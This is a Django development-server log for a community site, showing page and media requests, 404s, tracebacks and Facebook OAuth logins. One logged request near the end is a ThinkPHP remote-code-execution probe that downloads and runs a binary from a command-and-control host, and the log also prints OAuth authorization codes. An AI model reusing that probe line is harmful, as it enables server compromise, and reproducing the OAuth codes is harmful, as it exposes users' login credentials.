[16/Dec/2018 20:07:37] "GET /media/media/Screen_Shot_2018-11-22_at_12.43.59_AM.png HTTP/1.1" 200 188416
[16/Dec/2018 20:09:02] "GET / HTTP/1.1" 200 16359
[16/Dec/2018 20:09:15] "GET /media/media/Screen_Shot_2018-11-22_at_12.43.59_AM.png HTTP/1.1" 200 2026547
[16/Dec/2018 20:09:16] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 200 172825
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:09:16] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
[16/Dec/2018 20:09:18] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 200 172825
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:09:18] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:09:19] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:09:21] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:09:21] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:10:37] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:10:37] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:11:31] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:11:32] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:12:37] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:12:38] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:13:18] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:13:19] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:13:26] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:13:26] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:13:46] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:13:46] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:14:52] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:14:53] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:15:36] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:15:37] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:15:51] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:15:52] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:16:06] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:16:06] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:16:35] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:16:35] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:17:41] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:17:42] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:17:43] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:17:43] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:17:54] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:17:54] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:17:59] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:17:59] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
[16/Dec/2018 20:18:01] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:18:02] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:18:11] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 200 2334720
[16/Dec/2018 20:18:20] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 200 3624914
[16/Dec/2018 20:18:31] "GET /media/media/Screen_Shot_2018-11-22_at_12.43.59_AM.png HTTP/1.1" 200 2026547
[16/Dec/2018 20:18:32] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_zLD6F9Z.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:18:33] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:18:34] "GET /media/media/brasspanchmukhinaag-500x500.png HTTP/1.1" 200 106496
[16/Dec/2018 20:18:35] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 200 106496
[16/Dec/2018 20:18:36] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:18:37] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:18:46] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 200 3624914
[16/Dec/2018 20:18:55] "GET /media/media/Screen_Shot_2018-11-22_at_12.43.59_AM.png HTTP/1.1" 200 2026547
[16/Dec/2018 20:18:56] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 200 106496
[16/Dec/2018 20:18:58] "GET /media/media/Pink-Floyd-Back-Catalogue-music-1.jpg HTTP/1.1" 200 172825
[16/Dec/2018 20:18:59] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_zLD6F9Z.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:19:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 200 102923
[16/Dec/2018 20:19:03] "GET /media/media/brasspanchmukhinaag-500x500.png HTTP/1.1" 200 454350
[16/Dec/2018 20:19:06] "GET /media/media/ACDC-Wallpaper-For-Desktop.jpg HTTP/1.1" 200 330672
[16/Dec/2018 20:19:07] "GET /media/media/jimmy-page-led-zeppelin-wallpaper.jpg HTTP/1.1" 200 102923
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:19:08] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:19:08] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:19:17] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:19:17] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:20:17] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:20:18] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 20:20:33] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 20:20:33] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Validating models...

System check identified no issues (0 silenced).
December 16, 2018 - 19:21:09
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
[16/Dec/2018 20:22:18] "GET / HTTP/1.1" 200 16868
[16/Dec/2018 20:22:24] "GET / HTTP/1.1" 200 16868
----------------------------------------
Exception happened during processing of request from ('47.247.114.181', 59213)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 313, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 344, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
  File "/usr/lib64/python3.7/ssl.py", line 1049, in recv_into
    return self.read(nbytes, buffer)
  File "/usr/lib64/python3.7/ssl.py", line 908, in read
    return self._sslobj.read(len, buffer)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[16/Dec/2018 20:28:48] "GET / HTTP/1.1" 500 67699
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[16/Dec/2018 20:28:50] "GET / HTTP/1.1" 500 67699
Not Found: /favicon.ico
[16/Dec/2018 20:28:51] "GET /favicon.ico HTTP/1.1" 404 5965
[16/Dec/2018 20:29:00] "GET /admin HTTP/1.1" 301 0
[16/Dec/2018 20:29:01] "GET /admin/ HTTP/1.1" 200 12428
[16/Dec/2018 20:29:02] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
[16/Dec/2018 20:29:02] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
[16/Dec/2018 20:29:03] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
[16/Dec/2018 20:29:04] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[16/Dec/2018 20:29:06] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[16/Dec/2018 20:29:06] "GET /admin/logout/ HTTP/1.1" 200 1207
[16/Dec/2018 20:29:07] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[16/Dec/2018 20:29:08] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[16/Dec/2018 20:29:09] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[16/Dec/2018 20:29:14] "GET / HTTP/1.1" 200 16089
[16/Dec/2018 20:29:15] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 20:29:17] "GET /media/media/1.png HTTP/1.1" 200 217917
[16/Dec/2018 20:29:18] "GET /media/media/2.png HTTP/1.1" 200 218829
[16/Dec/2018 20:29:19] "GET /media/media/3.png HTTP/1.1" 200 62062
[16/Dec/2018 20:29:19] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 20:29:21] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[16/Dec/2018 20:29:22] "GET /logo.jpeg HTTP/1.1" 404 5959
[16/Dec/2018 20:30:28] "GET /community/3 HTTP/1.1" 301 0
[16/Dec/2018 20:30:28] "GET /community/3/ HTTP/1.1" 200 11497
Not Found: /community/3/logo.jpeg
[16/Dec/2018 20:30:30] "GET /community/3/logo.jpeg HTTP/1.1" 404 5995
[16/Dec/2018 20:33:17] "GET /community/3/members_list HTTP/1.1" 200 8051
[16/Dec/2018 20:33:18] "GET /profile/5 HTTP/1.1" 302 0
[16/Dec/2018 20:33:19] "GET /accounts/login/?next=/profile/5 HTTP/1.1" 200 2762
Not Found: /accounts/login/logo.jpeg
[16/Dec/2018 20:33:20] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6004
[16/Dec/2018 20:33:21] "GET /community/3/members_list HTTP/1.1" 200 8051
[16/Dec/2018 20:33:24] "GET /login/ HTTP/1.1" 200 2762
Not Found: /login/logo.jpeg
[16/Dec/2018 20:33:24] "GET /login/logo.jpeg HTTP/1.1" 404 5977
[16/Dec/2018 20:33:26] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[16/Dec/2018 20:33:29] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 20:33:31] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQA-svjPBuL2b3a_eBt7KgJQw1RtE3uWc6rpielVJze-vXFnljOAQqvxlk03n2w4zkXVmk9OzaPEgJ0tp9yd9QGL6h77KagKIX4HJY58AEDBp2UGDY5s1Zm9Q4tbYwKLhA-bRAJrNIbuATXIpSJBwmsbc5anrLXx57hVlf3W1yto2dcyC3cnW1o9s9TtRPs_zl8ilJ0jedyz9gIsDRtD60hePeJHOZc_0wZBY7q2XSg1QuwQ8HqMgj75NI-XK73bQNRkzfqGaq9S6-F5l5u8WhYbdZpW2TkG-_fWVhVSRUxL738PX-NuikwkQaescIgSSWysHPZYLJUc6te9HxEu-GLpqjrN8cXkoPTDcIY2MvBcAQ&state=WLHmUrviSbOBXknsFLA21USgWhWhlHbj HTTP/1.1" 302 0
[16/Dec/2018 20:33:32] "GET / HTTP/1.1" 200 16868
[16/Dec/2018 20:33:44] "GET /profile/9 HTTP/1.1" 200 22819
Not Found: /profile/logo.jpeg
[16/Dec/2018 20:33:45] "GET /profile/logo.jpeg HTTP/1.1" 404 5983
[16/Dec/2018 20:35:24] "GET / HTTP/1.1" 200 16868
[16/Dec/2018 20:35:26] "GET /community/3/ HTTP/1.1" 200 12237
----------------------------------------
Exception happened during processing of request from ('47.247.114.181', 39284)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 313, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 344, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
  File "/usr/lib64/python3.7/ssl.py", line 1049, in recv_into
    return self.read(nbytes, buffer)
  File "/usr/lib64/python3.7/ssl.py", line 908, in read
    return self._sslobj.read(len, buffer)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Dec/2018 23:41:13] "GET / HTTP/1.1" 200 16089
[17/Dec/2018 00:59:13] "GET /community/3/ HTTP/1.1" 200 12237
Not Found: /favicon.ico
[17/Dec/2018 01:23:40] "GET /favicon.ico HTTP/1.1" 404 5965
[17/Dec/2018 01:23:49] "GET /logout HTTP/1.1" 302 0
[17/Dec/2018 01:23:49] "GET /login/ HTTP/1.1" 200 2762
[17/Dec/2018 01:23:50] "GET /media/media/logo.png HTTP/1.1" 304 0
Not Found: /login/logo.jpeg
[17/Dec/2018 01:23:51] "GET /login/logo.jpeg HTTP/1.1" 404 5977
[17/Dec/2018 01:23:52] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[17/Dec/2018 01:23:55] "GET /oauth/complete/facebook/?granted_scopes=email%2Cpublic_profile&denied_scopes&code=AQD7HK0So-7Qfc2mqSYoKxmG2CkK149P9ag94htUdasKm5hjmt_Xykhd5wcAarMxHcyCDwYmpHOT9GGRIs4taQXeooLDrmoXhLvMFTj4uGc73ypcZhN4wd2PCNo1u2b0-SZj_fx7fLrjf14bxzhFh2yqhU7wuo0Od2jzAnm44TOZ3Sr36NYJ0jSrBLwzJzRMzqVCoTbQL5brCfmx3qZAM1PyA8RirCe8ibblfWes6dO2fpbHSg03G-ds9yYoftQ8ptEbaRQArEEkftC_3dm-5x_Mgm_AGcpEr-E9z7sUUhM_zIKtMGy0h2Rgr5yXwVP9VRmxZPGjnGxRSsOKC7x8xJ9z1n8KvfHu2lmBcKqBC_w2rQ&state=9eFWNoBwJkhO5rhREQhPDiX1tVP4TU3r HTTP/1.1" 302 0
[17/Dec/2018 01:23:56] "GET / HTTP/1.1" 200 16871
[17/Dec/2018 01:23:59] "GET /media/media/1.png HTTP/1.1" 200 217917
[17/Dec/2018 01:24:00] "GET /media/media/2.png HTTP/1.1" 200 218829
[17/Dec/2018 01:24:01] "GET /media/media/3.png HTTP/1.1" 200 62062
Not Found: /logo.jpeg
[17/Dec/2018 01:24:02] "GET /logo.jpeg HTTP/1.1" 404 5959
[17/Dec/2018 01:24:06] "GET /creategroup HTTP/1.1" 301 0
[17/Dec/2018 01:24:06] "GET /creategroup/ HTTP/1.1" 200 8500
Not Found: /creategroup/logo.jpeg
[17/Dec/2018 01:24:08] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5995
[17/Dec/2018 01:24:22] "GET /profile/10 HTTP/1.1" 200 22832
[17/Dec/2018 01:24:22] "GET /requests HTTP/1.1" 200 5809
[17/Dec/2018 01:24:24] "GET /profile/10 HTTP/1.1" 200 22832
Not Found: /profile/logo.jpeg
[17/Dec/2018 01:24:25] "GET /profile/logo.jpeg HTTP/1.1" 404 5983
[17/Dec/2018 01:24:28] "GET /profile/10 HTTP/1.1" 200 22832
[17/Dec/2018 01:24:29] "GET /profile/10/mycommunities HTTP/1.1" 200 5501
Not Found: /profile/10/logo.jpeg
[17/Dec/2018 01:24:29] "GET /profile/10/logo.jpeg HTTP/1.1" 404 5992
[17/Dec/2018 01:24:32] "GET /profile/10 HTTP/1.1" 200 22832
[17/Dec/2018 01:24:35] "GET / HTTP/1.1" 200 16871
[17/Dec/2018 01:25:05] "GET /profile/10 HTTP/1.1" 200 22832
[19/Dec/2018 07:02:33] "GET /community/4/ HTTP/1.1" 200 16084
[19/Dec/2018 07:02:36] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 07:02:40] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 07:02:40] "GET /community/5/ HTTP/1.1" 200 15031
[19/Dec/2018 07:02:48] "GET /profile/12 HTTP/1.1" 200 19438
[19/Dec/2018 07:02:50] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:02:51] "GET /media/media/1.png HTTP/1.1" 304 0
[19/Dec/2018 07:02:54] "GET /media/media/2.png HTTP/1.1" 304 0
[19/Dec/2018 07:02:54] "GET /media/media/3.png HTTP/1.1" 304 0
[19/Dec/2018 07:03:34] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:03:35] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:03:43] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:04:16] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:04:17] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 07:04:17] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:04:18] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 07:04:28] "GET /creategroup/ HTTP/1.1" 200 10422
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 07:17:59] "GET / HTTP/1.1" 400 62409
[19/Dec/2018 07:32:14] "GET / HTTP/1.1" 200 22139
[19/Dec/2018 07:32:15] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 304 0
[19/Dec/2018 07:32:16] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /index.php
[19/Dec/2018 07:32:36] "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://cnc.arm7plz.xyz/bins/set.x86%20-O%20/tmp/.eSeAlg;%20chmod%20777%20/tmp/.eSeAlg;%20/tmp/.eSeAlg%20thinkphp HTTP/1.1" 400 65070
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 07:47:38] "GET / HTTP/1.0" 400 62300
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 07:58:49] "GET / HTTP/1.1" 400 62290
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[19/Dec/2018 08:33:49] "GET / HTTP/1.0" 400 62302
Not Found: /robots.txt
[19/Dec/2018 08:37:36] "GET /robots.txt HTTP/1.1" 404 5961
[19/Dec/2018 08:37:40] "GET / HTTP/1.1" 200 21360
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
